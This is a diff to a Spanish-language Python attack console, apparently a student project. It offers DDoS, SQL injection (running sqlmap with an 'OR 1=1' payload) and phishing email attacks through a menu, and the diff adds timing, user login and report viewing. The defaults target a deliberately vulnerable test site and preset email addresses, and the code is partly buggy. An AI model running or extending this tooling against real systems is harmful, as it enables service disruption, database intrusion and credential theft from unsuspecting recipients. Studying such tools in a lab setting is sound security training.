@@ -1,9 +1,7 @@
-import sys
 import random
 import logging
 from typing import List
 from abc import ABC, abstractmethod
-from scapy.all import IP, ICMP, send
 import multiprocessing
 import time
 import requests
@@ -12,8 +10,8 @@ from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 import subprocess
-import json
-from users import User
+
+# from attackstatemng import save_attack_state, load_attack_state
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -27,6 +25,8 @@ class Attack(ABC):
         self.__attack_type = attack_type
         self.__targets = targets
         self.status = "pending"
+        self.duration = 0
+        self.result = None
 
     def get_attack_type(self) -> AttackType:
         return self.__attack_type
@@ -96,11 +96,11 @@ class DDoSAttack(Attack):
         p.close()
         p.join()
 
-        total_s = float(time.time() - t0)
+        self.duration = time.time() - t0
         total_p = int(self.n_ips) * int(self.n_msg)
-        ratio = float(total_p) / float(total_s)
-        print(f"\nTotal: \nTiempo:\t{int(total_s)} segundos")
-        print(f"Paquetes:\t{total_p} \nVelocidad:\t{int(ratio)} p/s")
+        ratio = float(total_p) / float(self.duration)
+        self.result = f"Tiempo: {int(self.duration)} segundos, Paquetes: {total_p}, Velocidad: {int(ratio)} p/s"
+        print(f"\nTotal: \n{self.result}")
 
     def pause(self) -> None:
         self.status = "paused"
@@ -115,14 +115,18 @@ class SQLInjectionAttack(Attack):
         super().__init__(AttackType.SQL_INJECTION, [target_url])
         self.__target_url = target_url
         self.__payload = payload
+    
     def get_target_url(self):
         return self.__target_url
-    
 
     def start(self) -> None:
         self.status = "running"
         print(f"Iniciando SQL Injection en {self.__target_url} con el payload: {self.__payload}")
+        t0 = time.time()
         self.run_sqlmap()
+        self.duration = time.time() - t0
+        self.result = "SQL Injection completado"
+        print(f"Duración: {self.duration} segundos")
 
     def run_sqlmap(self) -> None:
         command = f"sqlmap -u {self.__target_url} --data='{self.__payload}' --batch"
@@ -149,7 +153,11 @@ class PhishingAttack(Attack):
     def start(self) -> None:
         self.status = "running"
         print(f"Enviando correos de phishing a: {', '.join(self.__target_emails)} con la plantilla: {self.__template}")
+        t0 = time.time()
         self.send_emails()
+        self.duration = time.time() - t0
+        self.result = "Phishing emails enviados"
+        print(f"Duración: {self.duration} segundos")
 
     def send_emails(self) -> None:
         for email in self.__target_emails:
@@ -185,132 +193,111 @@ class PhishingAttack(Attack):
         self.driver.quit()
         print("Ataque de phishing detenido.")
 
-def save_attack_state(attack: Attack, user: User) -> None:
-    attack_data = {
-        "user": user.username,
-        "type": attack.get_attack_type().value,
-        "status": attack.status,
-        "targets": attack.get_targets(),
-        "params": {},
-        "time": time.strftime("%Y-%m-%d %H:%M:%S")
-    }
-    
-    if isinstance(attack, DDoSAttack):
-        attack_data["params"] = {
-            "dst_url": attack.get_target_url(),  # Cambiado aquí
-            "n_ips": attack.n_ips,
-            "n_msg": attack.n_msg,
-            "threads": attack.threads
-        }
-    elif isinstance(attack, SQLInjectionAttack):
-        attack_data["params"] = {
-            "target_url": attack.get_target_url(),  # Cambiado aquí
-            "payload": attack._SQLInjectionAttack__payload
-        }
-    elif isinstance(attack, PhishingAttack):
-        attack_data["params"] = {
-            "target_emails": attack.get_target_url(),  # Cambiado aquí
-            "template": attack._PhishingAttack__template
-        }
-    
-    with open(f"./ataques/{user.username}_attack_state.json", "w") as file:
-        json.dump(attack_data, file, indent=4)
-    print(f"Estado del ataque guardado para {user.username}: {attack_data}")
+def authenticate_user():
+    user_manager = UserManager()
+    user_manager.load_users('users.txt')
+    while True:
+        print("1. Registrarse")
+        print("2. Iniciar sesión")
+        print("3. Salir")
+        choice = input("Elige una opción: ")
+        if choice == '1':
+            username = input("Introduce el nombre de usuario: ")
+            role = input("Introduce el rol (admin/user): ").upper()
+            if role in Role.__members__:
+                user = user_manager.add_user(username, Role[role])
+                user_manager.save_users('users.txt')
+                print("¡Usuario registrado con éxito!")
+                return user
+            else:
+                print("Rol inválido. Por favor, inténtalo de nuevo.")
+        elif choice == '2':
+            username = input("Introduce el nombre de usuario: ")
+            user = user_manager.get_user(username)
+            if user:
+                print(f"¡Bienvenido {user.username}!")
+                return user
+            else:
+                print("Usuario no encontrado. Por favor, regístrate primero.")
+        elif choice == '3':
+            return None
+        else:
+            print("Opción inválida. Por favor, inténtalo de nuevo.")
 
+def initDDoS() -> None:
+    target_url = input("Ingrese la URL de destino para el ataque DDoS (default: http://testphp.vulnweb.com): ") or "http://testphp.vulnweb.com"
+    n_ips = input("Ingrese el número de IPs (default: 10): ") or 10
+    n_msg = input("Ingrese el número de mensajes por IP (default: 5): ") or 5
+    threads = input("Ingrese el número de hilos (default: 4): ") or 4
+    ddos_attack = DDoSAttack(target_url, int(n_ips), int(n_msg), int(threads))
+    save_attack_state(ddos_attack, user.username)
+    ddos_attack.start()
+    save_attack_state(ddos_attack, user.username)
+def initSQL() -> None:
+    target_url = input("Ingrese la URL para el ataque SQL Injection (default: generic url): ") or "http:testphp.vulnweb.com/showimage.php?file=1"
+    payload = input('Ingrese el payload (default: OR 1=1): ') or 'OR 1=1'
+    sql_injection_attack = SQLInjectionAttack(target_url, payload)
+    save_attack_state(sql_injection_attack, user.username)
+    sql_injection_attack.start()
+    save_attack_state(sql_injection_attack, user.username)
+def initPhishing() -> None:
+    target_emails = input("Ingrese los correos electrónicos de destino separados por comas (default: correos predefinidos): ") or "manelguvi100@gmail.com,manelguvi200@gmail.com"
+    template = input("Ingrese la plantilla del correo de phishing (default: Este es un correo de phishing. Por favor, haga clic en el enlace malvado D): ") or "Este es un correo de phishing. Por favor, haga clic en el enlace malvado D:"
+    phishing_attack = PhishingAttack(target_emails.split(','), template)
+    save_attack_state(phishing_attack, user.username)
+    phishing_attack.start()
+    save_attack_state(phishing_attack, user.username)
 
-def load_attack_state() -> Attack:
-    try:
-        with open("./ataques/attack_state.json", "r") as file:
-            attack_data = json.load(file)
-            attack_type = AttackType(attack_data["type"])
-            status = attack_data["status"]
-            targets = attack_data["targets"]
+def main_menu(user):
+    while True:
+        print("\nSeleccione el tipo de ataque a ejecutar:")
+        print("1. DDoS Attack")
+        print("2. SQL Injection Attack")
+        print("3. Phishing Attack")
+        print("4. Ver informes de ataque")
+        print("5. Salir")
+        choice = input("Ingrese el número de su elección: ")
+        if choice == '1':
+            initDDoS()
+        elif choice == '2':
+            initSQL()
+        elif choice == '3':
+            initPhishing()
+        elif choice == '4':
+            view_attack_reports(user.username)
+        elif choice == '5':
+            print("Saliendo...")
+            break
+        else:
+            print("Opción no válida. Por favor, intente de nuevo.")
 
-            if attack_type == AttackType.DDoS:
-                return DDoSAttack(
-                    dst_url=targets[0],
-                    n_ips=attack_data["params"]["n_ips"],
-                    n_msg=attack_data["params"]["n_msg"],
-                    threads=attack_data["params"]["threads"]
-                )
-            elif attack_type == AttackType.SQL_INJECTION:
-                return SQLInjectionAttack(
-                    target_url=targets[0],
-                    payload=attack_data["params"]["payload"]
-                )
-            elif attack_type == AttackType.PHISHING:
-                return PhishingAttack(
-                    target_emails=attack_data["params"]["target_emails"],
-                    template=attack_data["params"]["template"]
-                )
-    except (FileNotFoundError, json.JSONDecodeError):
-        print("No se encontró un estado guardado o hubo un error al cargarlo.")
-        return None
+        def view_attack_reports(username):
+            reports_dir = 'ataques'
+            if not os.path.exists(reports_dir):
+                print("No hay informes de ataque disponibles.")
+                return
+
+            user_reports = [f for f in os.listdir(reports_dir) if f.startswith(username + "_")]
+            if not user_reports:
+                print("No hay informes de ataque disponibles para tu usuario.")
+                return
+
+            print("\nInformes de ataque disponibles:")
+            for report in user_reports:
+                print(report)
+            report_choice = input("Ingrese el nombre del informe que desea ver: ")
+            if report_choice in user_reports:
+                with open(os.path.join(reports_dir, report_choice), 'r') as file:
+                    print(file.read())
+
+            else:
+                print("Informe no encontrado.")
 
 
 if __name__ == '__main__':
-    attack = load_attack_state()
+    from users import User, Role, UserManager
+    from attackstatemng import save_attack_state
+    import os
+    user = authenticate_user()
+    main_menu(user)
 
-    if attack:
-        print(f"Se encontró un ataque guardado de tipo {attack.get_attack_type().value} con estado {attack.status}.")
-        resume = input("¿Deseas reanudar este ataque? (y/n): ")
-        if resume.lower() == 'y':
-            if attack.status == "running":
-                print(f"El ataque ya está en curso.")
-            elif attack.status == "paused":
-                attack.start()
-            elif attack.status == "stopped":
-                print("El ataque fue detenido anteriormente. Elige un nuevo ataque.")
-            else:
-                print("Estado del ataque desconocido.")
-        else:
-            attack = None
-
-    # Si no se carga un ataque guardado o el usuario decide no reanudarlo
-    if not attack:
-        def initDDoS() -> None:
-            target_url = input("Ingrese la URL de destino para el ataque DDoS (default: http://testphp.vulnweb.com): ") or "http://testphp.vulnweb.com"
-            n_ips = input("Ingrese el número de IPs (default: 10): ") or 10
-            n_msg = input("Ingrese el número de mensajes por IP (default: 5): ") or 5
-            threads = input("Ingrese el número de hilos (default: 4): ") or 4
-            ddos_attack = DDoSAttack(target_url, int(n_ips), int(n_msg), int(threads))
-            ddos_attack.start()
-            save_attack_state(ddos_attack)
-
-        def initSQL() -> None:
-            target_url = input("Ingrese la URL para el ataque SQL Injection (default: generic url): ") or "http:testphp.vulnweb.com/showimage.php?file=1"
-            payload = input('Ingrese el payload (default: OR 1=1): ') or 'OR 1=1'
-            sql_injection_attack = SQLInjectionAttack(target_url, payload)
-            sql_injection_attack.start()
-            save_attack_state(sql_injection_attack)
-
-        def initPhishing() -> None:
-            target_emails = input("Ingrese los correos electrónicos de destino separados por comas (default: correos predefinidos): ") or "manelguvi100@gmail.com,manelguvi200@gmail.com"
-            template = input("Ingrese la plantilla del correo de phishing (default: Este es un correo de phishing. Por favor, haga clic en el enlace malvado D): ") or "Este es un correo de phishing. Por favor, haga clic en el enlace malvado D:"
-            phishing_attack = PhishingAttack(target_emails.split(','), template)
-            phishing_attack.start()
-            save_attack_state(phishing_attack)
-
-        while True:
-            print("\nSeleccione el tipo de ataque a ejecutar:")
-            print("1. DDoS Attack")
-            print("2. SQL Injection Attack")
-            print("3. Phishing Attack")
-            print("4. Salir")
-
-            choice = input("Ingrese el número de su elección: ")
-            #? DDoS
-            if choice == '1':
-                initDDoS()
-            #? SQL
-            elif choice == '2':
-                initSQL()
-            #? Phising
-            elif choice == '3':
-                initPhishing()
-
-            elif choice == '4':
-                print("Saliendo...")
-                break
-            else:
-                print("Opción no válida. Por favor, intente de nuevo.")
